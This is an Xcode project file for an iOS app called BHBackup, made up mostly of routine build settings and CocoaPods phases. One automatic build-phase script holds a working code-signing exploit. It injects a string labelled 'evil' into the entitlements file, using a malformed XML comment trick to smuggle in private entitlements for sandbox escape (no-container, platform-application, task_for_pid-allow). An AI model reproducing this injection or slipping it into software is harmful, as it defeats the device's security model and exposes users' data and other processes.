// !$*UTF8*$!
{
	archiveVersion = 1;
	classes = {
	};
	objectVersion = 51;
	objects = {

/* Begin PBXBuildFile section */
		506414F72460ABD8008A5C95 /* SSZipArchive.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 506414F62460ABD8008A5C95 /* SSZipArchive.framework */; };
		50C682A4245F68A600C1B35F /* AppDelegate.swift in Sources */ = {isa = PBXBuildFile; fileRef = 50C682A3245F68A600C1B35F /* AppDelegate.swift */; };
		50C682A6245F68A600C1B35F /* SceneDelegate.swift in Sources */ = {isa = PBXBuildFile; fileRef = 50C682A5245F68A600C1B35F /* SceneDelegate.swift */; };
		50C682A8245F68A600C1B35F /* ViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 50C682A7245F68A600C1B35F /* ViewController.swift */; };
		50C682AB245F68A600C1B35F /* Main.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = 50C682A9245F68A600C1B35F /* Main.storyboard */; };
		50C682AD245F68A800C1B35F /* Assets.xcassets in Resources */ = {isa = PBXBuildFile; fileRef = 50C682AC245F68A800C1B35F /* Assets.xcassets */; };
		50C682B0245F68A800C1B35F /* LaunchScreen.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = 50C682AE245F68A800C1B35F /* LaunchScreen.storyboard */; };
		50C682C0245F79C400C1B35F /* BHbackup_structs.swift in Sources */ = {isa = PBXBuildFile; fileRef = 50C682BF245F79C400C1B35F /* BHbackup_structs.swift */; };
		613CD790DC38471F7AAB6D35 /* Pods_BHBackup.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = ECB428A8422703DE438316BE /* Pods_BHBackup.framework */; };
/* End PBXBuildFile section */

/* Begin PBXFileReference section */
		1696A8DBA78763F0A246C9A7 /* Pods-BHBackup.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-BHBackup.release.xcconfig"; path = "Target Support Files/Pods-BHBackup/Pods-BHBackup.release.xcconfig"; sourceTree = "<group>"; };
		506414F62460ABD8008A5C95 /* SSZipArchive.framework */ = {isa = PBXFileReference; explicitFileType = wrapper.framework; path = SSZipArchive.framework; sourceTree = BUILT_PRODUCTS_DIR; };
		50C682A0245F68A600C1B35F /* BHBackup.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = BHBackup.app; sourceTree = BUILT_PRODUCTS_DIR; };
		50C682A3245F68A600C1B35F /* AppDelegate.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppDelegate.swift; sourceTree = "<group>"; };
		50C682A5245F68A600C1B35F /* SceneDelegate.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SceneDelegate.swift; sourceTree = "<group>"; };
		50C682A7245F68A600C1B35F /* ViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ViewController.swift; sourceTree = "<group>"; };
		50C682AA245F68A600C1B35F /* Base */ = {isa = PBXFileReference; lastKnownFileType = file.storyboard; name = Base; path = Base.lproj/Main.storyboard; sourceTree = "<group>"; };
		50C682AC245F68A800C1B35F /* Assets.xcassets */ = {isa = PBXFileReference; lastKnownFileType = folder.assetcatalog; path = Assets.xcassets; sourceTree = "<group>"; };
		50C682AF245F68A800C1B35F /* Base */ = {isa = PBXFileReference; lastKnownFileType = file.storyboard; name = Base; path = Base.lproj/LaunchScreen.storyboard; sourceTree = "<group>"; };
		50C682B1245F68A800C1B35F /* Info.plist */ = {isa = PBXFileReference; lastKnownFileType = text.plist.xml; path = Info.plist; sourceTree = "<group>"; };
		50C682BF245F79C400C1B35F /* BHbackup_structs.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = BHbackup_structs.swift; sourceTree = "<group>"; };
		BE0259EC76913696B8C6FA6B /* Pods-BHBackup.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-BHBackup.debug.xcconfig"; path = "Target Support Files/Pods-BHBackup/Pods-BHBackup.debug.xcconfig"; sourceTree = "<group>"; };
		ECB428A8422703DE438316BE /* Pods_BHBackup.framework */ = {isa = PBXFileReference; explicitFileType = wrapper.framework; includeInIndex = 0; path = Pods_BHBackup.framework; sourceTree = BUILT_PRODUCTS_DIR; };
/* End PBXFileReference section */

/* Begin PBXFrameworksBuildPhase section */
		50C6829D245F68A600C1B35F /* Frameworks */ = {
			isa = PBXFrameworksBuildPhase;
			buildActionMask = 2147483647;
			files = (
				613CD790DC38471F7AAB6D35 /* Pods_BHBackup.framework in Frameworks */,
				506414F72460ABD8008A5C95 /* SSZipArchive.framework in Frameworks */,
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXFrameworksBuildPhase section */

/* Begin PBXGroup section */
		4031AA20581A4E7B6DE72F60 /* Pods */ = {
			isa = PBXGroup;
			children = (
				BE0259EC76913696B8C6FA6B /* Pods-BHBackup.debug.xcconfig */,
				1696A8DBA78763F0A246C9A7 /* Pods-BHBackup.release.xcconfig */,
			);
			path = Pods;
			sourceTree = "<group>";
		};
		50C68297245F68A600C1B35F = {
			isa = PBXGroup;
			children = (
				50C682A2245F68A600C1B35F /* BHBackup */,
				50C682A1245F68A600C1B35F /* Products */,
				4031AA20581A4E7B6DE72F60 /* Pods */,
				A1D265C69D298024DFF4DF98 /* Frameworks */,
			);
			sourceTree = "<group>";
		};
		50C682A1245F68A600C1B35F /* Products */ = {
			isa = PBXGroup;
			children = (
				50C682A0245F68A600C1B35F /* BHBackup.app */,
			);
			name = Products;
			sourceTree = "<group>";
		};
		50C682A2245F68A600C1B35F /* BHBackup */ = {
			isa = PBXGroup;
			children = (
				50C682BF245F79C400C1B35F /* BHbackup_structs.swift */,
				50C682A3245F68A600C1B35F /* AppDelegate.swift */,
				50C682A5245F68A600C1B35F /* SceneDelegate.swift */,
				50C682A7245F68A600C1B35F /* ViewController.swift */,
				50C682A9245F68A600C1B35F /* Main.storyboard */,
				50C682AC245F68A800C1B35F /* Assets.xcassets */,
				50C682AE245F68A800C1B35F /* LaunchScreen.storyboard */,
				50C682B1245F68A800C1B35F /* Info.plist */,
			);
			path = BHBackup;
			sourceTree = "<group>";
		};
		A1D265C69D298024DFF4DF98 /* Frameworks */ = {
			isa = PBXGroup;
			children = (
				506414F62460ABD8008A5C95 /* SSZipArchive.framework */,
				ECB428A8422703DE438316BE /* Pods_BHBackup.framework */,
			);
			name = Frameworks;
			sourceTree = "<group>";
		};
/* End PBXGroup section */

/* Begin PBXNativeTarget section */
		50C6829F245F68A600C1B35F /* BHBackup */ = {
			isa = PBXNativeTarget;
			buildConfigurationList = 50C682B4245F68A800C1B35F /* Build configuration list for PBXNativeTarget "BHBackup" */;
			buildPhases = (
				B717EF5328E71AD40A3E40F8 /* [CP] Check Pods Manifest.lock */,
				50C6829C245F68A600C1B35F /* Sources */,
				50C6829D245F68A600C1B35F /* Frameworks */,
				50C6829E245F68A600C1B35F /* Resources */,
				50C682B7245F68CC00C1B35F /* ShellScript */,
				A308F5DB2FCE740FBE30462B /* [CP] Embed Pods Frameworks */,
			);
			buildRules = (
			);
			dependencies = (
			);
			name = BHBackup;
			productName = AppsManager;
			productReference = 50C682A0245F68A600C1B35F /* BHBackup.app */;
			productType = "com.apple.product-type.application";
		};
/* End PBXNativeTarget section */

/* Begin PBXProject section */
		50C68298245F68A600C1B35F /* Project object */ = {
			isa = PBXProject;
			attributes = {
				LastSwiftUpdateCheck = 1140;
				LastUpgradeCheck = 1140;
				ORGANIZATIONNAME = BandarHelal;
				TargetAttributes = {
					50C6829F245F68A600C1B35F = {
						CreatedOnToolsVersion = 11.4.1;
						LastSwiftMigration = 1140;
					};
				};
			};
			buildConfigurationList = 50C6829B245F68A600C1B35F /* Build configuration list for PBXProject "BHBackup" */;
			compatibilityVersion = "Xcode 9.3";
			developmentRegion = en;
			hasScannedForEncodings = 0;
			knownRegions = (
				en,
				Base,
			);
			mainGroup = 50C68297245F68A600C1B35F;
			productRefGroup = 50C682A1245F68A600C1B35F /* Products */;
			projectDirPath = "";
			projectRoot = "";
			targets = (
				50C6829F245F68A600C1B35F /* BHBackup */,
			);
		};
/* End PBXProject section */

/* Begin PBXResourcesBuildPhase section */
		50C6829E245F68A600C1B35F /* Resources */ = {
			isa = PBXResourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
				50C682B0245F68A800C1B35F /* LaunchScreen.storyboard in Resources */,
				50C682AD245F68A800C1B35F /* Assets.xcassets in Resources */,
				50C682AB245F68A600C1B35F /* Main.storyboard in Resources */,
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXResourcesBuildPhase section */

/* Begin PBXShellScriptBuildPhase section */
		50C682B7245F68CC00C1B35F /* ShellScript */ = {
			isa = PBXShellScriptBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			inputFileListPaths = (
			);
			inputPaths = (
			);
			outputFileListPaths = (
			);
			outputPaths = (
			);
			runOnlyForDeploymentPostprocessing = 0;
			shellPath = /usr/local/bin/python3;
			shellScript = "import os\n# preinstalled python is python2\nfilename = '/'.join(map(os.environ.get, ('TARGET_TEMP_DIR', 'FULL_PRODUCT_NAME'))) + '.xcent'\nevil = '''\n    <!---><!-->\n    <key>platform-application</key>\n    <true/>\n    <key>com.apple.private.security.no-container</key>\n    <true/>\n    <key>task_for_pid-allow</key>\n    <true/>\n    <!-- -->\n'''\nwith open(filename, 'r') as fp:\n  buf = fp.read()\ncursor = buf.rfind('</dict>')\noutput = buf[0:cursor] + evil + buf[cursor:]\nwith open(filename, 'w') as fp:\n  fp.write(output)\n  \n";
		};
		A308F5DB2FCE740FBE30462B /* [CP] Embed Pods Frameworks */ = {
			isa = PBXShellScriptBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			inputFileListPaths = (
				"${PODS_ROOT}/Target Support Files/Pods-BHBackup/Pods-BHBackup-frameworks-${CONFIGURATION}-input-files.xcfilelist",
			);
			name = "[CP] Embed Pods Frameworks";
			outputFileListPaths = (
				"${PODS_ROOT}/Target Support Files/Pods-BHBackup/Pods-BHBackup-frameworks-${CONFIGURATION}-output-files.xcfilelist",
			);
			runOnlyForDeploymentPostprocessing = 0;
			shellPath = /bin/sh;
			shellScript = "\"${PODS_ROOT}/Target Support Files/Pods-BHBackup/Pods-BHBackup-frameworks.sh\"\n";
			showEnvVarsInLog = 0;
		};
		B717EF5328E71AD40A3E40F8 /* [CP] Check Pods Manifest.lock */ = {
			isa = PBXShellScriptBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			inputFileListPaths = (
			);
			inputPaths = (
				"${PODS_PODFILE_DIR_PATH}/Podfile.lock",
				"${PODS_ROOT}/Manifest.lock",
			);
			name = "[CP] Check Pods Manifest.lock";
			outputFileListPaths = (
			);
			outputPaths = (
				"$(DERIVED_FILE_DIR)/Pods-BHBackup-checkManifestLockResult.txt",
			);
			runOnlyForDeploymentPostprocessing = 0;
			shellPath = /bin/sh;
			shellScript = "diff \"${PODS_PODFILE_DIR_PATH}/Podfile.lock\" \"${PODS_ROOT}/Manifest.lock\" > /dev/null\nif [ $? != 0 ] ; then\n    # print error to STDERR\n    echo \"error: The sandbox is not in sync with the Podfile.lock. Run 'pod install' or update your CocoaPods installation.\" >&2\n    exit 1\nfi\n# This output is used by Xcode 'outputs' to avoid re-running this script phase.\necho \"SUCCESS\" > \"${SCRIPT_OUTPUT_FILE_0}\"\n";
			showEnvVarsInLog = 0;
		};
/* End PBXShellScriptBuildPhase section */

/* Begin PBXSourcesBuildPhase section */
		50C6829C245F68A600C1B35F /* Sources */ = {
			isa = PBXSourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
				50C682A8245F68A600C1B35F /* ViewController.swift in Sources */,
				50C682A4245F68A600C1B35F /* AppDelegate.swift in Sources */,
				50C682C0245F79C400C1B35F /* BHbackup_structs.swift in Sources */,
				50C682A6245F68A600C1B35F /* SceneDelegate.swift in Sources */,
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXSourcesBuildPhase section */

/* Begin PBXVariantGroup section */
		50C682A9245F68A600C1B35F /* Main.storyboard */ = {
			isa = PBXVariantGroup;
			children = (
				50C682AA245F68A600C1B35F /* Base */,
			);
			name = Main.storyboard;
			sourceTree = "<group>";
		};
		50C682AE245F68A800C1B35F /* LaunchScreen.storyboard */ = {
			isa = PBXVariantGroup;
			children = (
				50C682AF245F68A800C1B35F /* Base */,
			);
			name = LaunchScreen.storyboard;
			sourceTree = "<group>";
		};
/* End PBXVariantGroup section */

/* Begin XCBuildConfiguration section */
		50C682B2245F68A800C1B35F /* Debug */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ALWAYS_SEARCH_USER_PATHS = NO;
				CLANG_ANALYZER_NONNULL = YES;
				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
				CLANG_CXX_LANGUAGE_STANDARD = "gnu++14";
				CLANG_CXX_LIBRARY = "libc++";
				CLANG_ENABLE_MODULES = YES;
				CLANG_ENABLE_OBJC_ARC = YES;
				CLANG_ENABLE_OBJC_WEAK = YES;
				CLANG_WARN_BLOCK_CAPTURE_AUTORELEASING = YES;
				CLANG_WARN_BOOL_CONVERSION = YES;
				CLANG_WARN_COMMA = YES;
				CLANG_WARN_CONSTANT_CONVERSION = YES;
				CLANG_WARN_DEPRECATED_OBJC_IMPLEMENTATIONS = YES;
				CLANG_WARN_DIRECT_OBJC_ISA_USAGE = YES_ERROR;
				CLANG_WARN_DOCUMENTATION_COMMENTS = YES;
				CLANG_WARN_EMPTY_BODY = YES;
				CLANG_WARN_ENUM_CONVERSION = YES;
				CLANG_WARN_INFINITE_RECURSION = YES;
				CLANG_WARN_INT_CONVERSION = YES;
				CLANG_WARN_NON_LITERAL_NULL_CONVERSION = YES;
				CLANG_WARN_OBJC_IMPLICIT_RETAIN_SELF = YES;
				CLANG_WARN_OBJC_LITERAL_CONVERSION = YES;
				CLANG_WARN_OBJC_ROOT_CLASS = YES_ERROR;
				CLANG_WARN_RANGE_LOOP_ANALYSIS = YES;
				CLANG_WARN_STRICT_PROTOTYPES = YES;
				CLANG_WARN_SUSPICIOUS_MOVE = YES;
				CLANG_WARN_UNGUARDED_AVAILABILITY = YES_AGGRESSIVE;
				CLANG_WARN_UNREACHABLE_CODE = YES;
				CLANG_WARN__DUPLICATE_METHOD_MATCH = YES;
				COPY_PHASE_STRIP = NO;
				DEBUG_INFORMATION_FORMAT = dwarf;
				ENABLE_STRICT_OBJC_MSGSEND = YES;
				ENABLE_TESTABILITY = YES;
				GCC_C_LANGUAGE_STANDARD = gnu11;
				GCC_DYNAMIC_NO_PIC = NO;
				GCC_NO_COMMON_BLOCKS = YES;
				GCC_OPTIMIZATION_LEVEL = 0;
				GCC_PREPROCESSOR_DEFINITIONS = (
					"DEBUG=1",
					"$(inherited)",
				);
				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
				GCC_WARN_ABOUT_RETURN_TYPE = YES_ERROR;
				GCC_WARN_UNDECLARED_SELECTOR = YES;
				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
				GCC_WARN_UNUSED_FUNCTION = YES;
				GCC_WARN_UNUSED_VARIABLE = YES;
				IPHONEOS_DEPLOYMENT_TARGET = 13.4;
				MTL_ENABLE_DEBUG_INFO = INCLUDE_SOURCE;
				MTL_FAST_MATH = YES;
				ONLY_ACTIVE_ARCH = YES;
				SDKROOT = iphoneos;
				SWIFT_ACTIVE_COMPILATION_CONDITIONS = DEBUG;
				SWIFT_OPTIMIZATION_LEVEL = "-Onone";
			};
			name = Debug;
		};
		50C682B3245F68A800C1B35F /* Release */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ALWAYS_SEARCH_USER_PATHS = NO;
				CLANG_ANALYZER_NONNULL = YES;
				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
				CLANG_CXX_LANGUAGE_STANDARD = "gnu++14";
				CLANG_CXX_LIBRARY = "libc++";
				CLANG_ENABLE_MODULES = YES;
				CLANG_ENABLE_OBJC_ARC = YES;
				CLANG_ENABLE_OBJC_WEAK = YES;
				CLANG_WARN_BLOCK_CAPTURE_AUTORELEASING = YES;
				CLANG_WARN_BOOL_CONVERSION = YES;
				CLANG_WARN_COMMA = YES;
				CLANG_WARN_CONSTANT_CONVERSION = YES;
				CLANG_WARN_DEPRECATED_OBJC_IMPLEMENTATIONS = YES;
				CLANG_WARN_DIRECT_OBJC_ISA_USAGE = YES_ERROR;
				CLANG_WARN_DOCUMENTATION_COMMENTS = YES;
				CLANG_WARN_EMPTY_BODY = YES;
				CLANG_WARN_ENUM_CONVERSION = YES;
				CLANG_WARN_INFINITE_RECURSION = YES;
				CLANG_WARN_INT_CONVERSION = YES;
				CLANG_WARN_NON_LITERAL_NULL_CONVERSION = YES;
				CLANG_WARN_OBJC_IMPLICIT_RETAIN_SELF = YES;
				CLANG_WARN_OBJC_LITERAL_CONVERSION = YES;
				CLANG_WARN_OBJC_ROOT_CLASS = YES_ERROR;
				CLANG_WARN_RANGE_LOOP_ANALYSIS = YES;
				CLANG_WARN_STRICT_PROTOTYPES = YES;
				CLANG_WARN_SUSPICIOUS_MOVE = YES;
				CLANG_WARN_UNGUARDED_AVAILABILITY = YES_AGGRESSIVE;
				CLANG_WARN_UNREACHABLE_CODE = YES;
				CLANG_WARN__DUPLICATE_METHOD_MATCH = YES;
				COPY_PHASE_STRIP = NO;
				DEBUG_INFORMATION_FORMAT = "dwarf-with-dsym";
				ENABLE_NS_ASSERTIONS = NO;
				ENABLE_STRICT_OBJC_MSGSEND = YES;
				GCC_C_LANGUAGE_STANDARD = gnu11;
				GCC_NO_COMMON_BLOCKS = YES;
				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
				GCC_WARN_ABOUT_RETURN_TYPE = YES_ERROR;
				GCC_WARN_UNDECLARED_SELECTOR = YES;
				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
				GCC_WARN_UNUSED_FUNCTION = YES;
				GCC_WARN_UNUSED_VARIABLE = YES;
				IPHONEOS_DEPLOYMENT_TARGET = 13.4;
				MTL_ENABLE_DEBUG_INFO = NO;
				MTL_FAST_MATH = YES;
				SDKROOT = iphoneos;
				SWIFT_COMPILATION_MODE = wholemodule;
				SWIFT_OPTIMIZATION_LEVEL = "-O";
				VALIDATE_PRODUCT = YES;
			};
			name = Release;
		};
		50C682B5245F68A800C1B35F /* Debug */ = {
			isa = XCBuildConfiguration;
			baseConfigurationReference = BE0259EC76913696B8C6FA6B /* Pods-BHBackup.debug.xcconfig */;
			buildSettings = {
				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
				CLANG_ENABLE_MODULES = YES;
				CODE_SIGN_STYLE = Automatic;
				DEVELOPMENT_TEAM = 8JMV3RHX32;
				INFOPLIST_FILE = BHBackup/Info.plist;
				IPHONEOS_DEPLOYMENT_TARGET = 13.0;
				LD_RUNPATH_SEARCH_PATHS = (
					"$(inherited)",
					"@executable_path/Frameworks",
				);
				PRODUCT_BUNDLE_IDENTIFIER = com.bandarhl.AppsManager;
				PRODUCT_NAME = "$(TARGET_NAME)";
				SWIFT_OBJC_BRIDGING_HEADER = "";
				SWIFT_OPTIMIZATION_LEVEL = "-Onone";
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = "1,2";
			};
			name = Debug;
		};
		50C682B6245F68A800C1B35F /* Release */ = {
			isa = XCBuildConfiguration;
			baseConfigurationReference = 1696A8DBA78763F0A246C9A7 /* Pods-BHBackup.release.xcconfig */;
			buildSettings = {
				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
				CLANG_ENABLE_MODULES = YES;
				CODE_SIGN_STYLE = Automatic;
				DEVELOPMENT_TEAM = 8JMV3RHX32;
				INFOPLIST_FILE = BHBackup/Info.plist;
				IPHONEOS_DEPLOYMENT_TARGET = 13.0;
				LD_RUNPATH_SEARCH_PATHS = (
					"$(inherited)",
					"@executable_path/Frameworks",
				);
				PRODUCT_BUNDLE_IDENTIFIER = com.bandarhl.AppsManager;
				PRODUCT_NAME = "$(TARGET_NAME)";
				SWIFT_OBJC_BRIDGING_HEADER = "";
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = "1,2";
			};
			name = Release;
		};
/* End XCBuildConfiguration section */

/* Begin XCConfigurationList section */
		50C6829B245F68A600C1B35F /* Build configuration list for PBXProject "BHBackup" */ = {
			isa = XCConfigurationList;
			buildConfigurations = (
				50C682B2245F68A800C1B35F /* Debug */,
				50C682B3245F68A800C1B35F /* Release */,
			);
			defaultConfigurationIsVisible = 0;
			defaultConfigurationName = Release;
		};
		50C682B4245F68A800C1B35F /* Build configuration list for PBXNativeTarget "BHBackup" */ = {
			isa = XCConfigurationList;
			buildConfigurations = (
				50C682B5245F68A800C1B35F /* Debug */,
				50C682B6245F68A800C1B35F /* Release */,
			);
			defaultConfigurationIsVisible = 0;
			defaultConfigurationName = Release;
		};
/* End XCConfigurationList section */
	};
	rootObject = 50C68298245F68A600C1B35F /* Project object */;
}
